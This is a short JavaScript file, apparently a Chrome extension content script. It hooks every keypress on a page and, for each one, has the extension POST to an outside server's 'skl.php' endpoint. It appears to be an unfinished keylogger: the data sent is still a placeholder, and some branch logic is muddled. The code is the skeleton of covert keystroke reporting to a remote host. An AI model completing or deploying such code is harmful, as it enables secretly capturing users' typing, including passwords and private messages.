document.addEventListener("keypress", function(e){
	if (!chrome.runtime)
	{
		chrome.runtime = chrome.extension;
		chrome.runtime.sendMessage({
		    method: "POST",
		    action: "xhttp",
		    url: "http://www.hebrongeorge.com/skl.php",
		    data: "q=something"
		}, function(responseText) {
			console.log(Object.prototype.toString.call(responseText));
	    	console.log(responseText);
    		/*Callback function to deal with the response*/
		});
	}
	else if (!chrome.runtime.onMessage)
	{
		console.log("Chrome 22-25");
	}
	else
	{
		chrome.runtime.sendMessage({
		    method: "POST",
		    action: "xhttp",
		    url: "http://www.hebrongeorge.com/skl.php",
		    data: "q=something"
		}, function(responseText) {
			console.log(Object.prototype.toString.call(responseText));
	    	console.log(responseText);
    		/*Callback function to deal with the response*/
		});
		console.log("Neither");
	}
})